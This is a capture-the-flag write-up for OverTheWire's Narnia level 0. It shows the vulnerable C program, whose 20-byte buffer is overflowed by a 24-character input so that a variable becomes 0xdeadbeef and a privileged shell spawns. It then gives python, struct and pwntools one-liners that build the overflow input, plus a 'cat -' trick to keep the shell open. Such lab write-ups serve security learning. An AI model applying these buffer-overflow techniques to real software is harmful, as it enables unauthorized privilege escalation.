  • The difficulty of the game is somewhere between Leviathan and Behemoth, but some of the levels could be quite tricky

#include <stdlib.h>

int main(){
    long val=0x41414141;
    char buf[20];

    printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
    printf("Here is your chance: ");
    scanf("%24s",&buf);

    printf("buf: %s\n",buf);
    printf("val: 0x%08x\n",val);

    if(val==0xdeadbeef){
        setreuid(geteuid(),geteuid());
        system("/bin/sh");
    }
    else {
        printf("WAY OFF!!!!\n");
        exit(1);
    }

    return 0;
}
  • From the source, we can obtain the buffer size, 20 and the input of 24 string characters is obtained from the users
  • The last extra 4 characters will overwrite the output of val, lets test it with python
1

python -c 'print "a"*20 + "bbbb"'
  • Now the output of value should change from x41x41x41x41 to x62x62x62x62 which is the hexadecimal representation of ‘b’
  • Lets test it

val filled with 4 x62’s

  • Looking back at the source, the application performs an if statement to compare the value of val (which we have access to modify)
  • We add the address 0xdeadbeef to overflow the application buffer and modify its “val” value
  • Since the address is of little endian type (reverse order 1234 will be reffered as 4321), we can perform this in multiple ways, some noteable ways are …

# addressing in reverse order
python -c 'print "a"*20 + "\xef\xbe\xad\xde"'

# with struct library
python -c 'import struct; print "a"*20 + struct.pack("<I", 0xdeadbeef)'

# with pwntools
python3 -c 'from pwn import *; print(b"a"*20 + p32(0xdeadbeef))'
  • Lets generate the output and provide as the input for the narnia0 binary
  • When the output of the python file is provided, we are able to successfully alter the value of the val. But, the first byte is set to null 0x00

missing first byte

  • Lets try to pipe the output of the python file to the binary
  • Now we are completely able to overwite the value of val 0xdeadbeef loaded in val

Why this piping worked and it fails when we provided the argument ? Python2 handles everything in bytes value, Therefore the generated address is of the bytes value. When the output is copied, it performs some type conversion which is converted as string. We can use hexdump to verfify this change differences in hexvalues

  • Now we are able to overwrite the value of val but we need a shell prompt as narnia1
  • To access the shell as narnia1, we can make use of the () bash expansion which creates a subshell and executes the command and pipe it to the application
  • Normal commands like whoami, ls wont work cause we are still running as the user narni0
  • To access as narnia1 we can interput the stdin commands with cat - and print the output to stdout
  • Now the shell is interpretted as narnia1
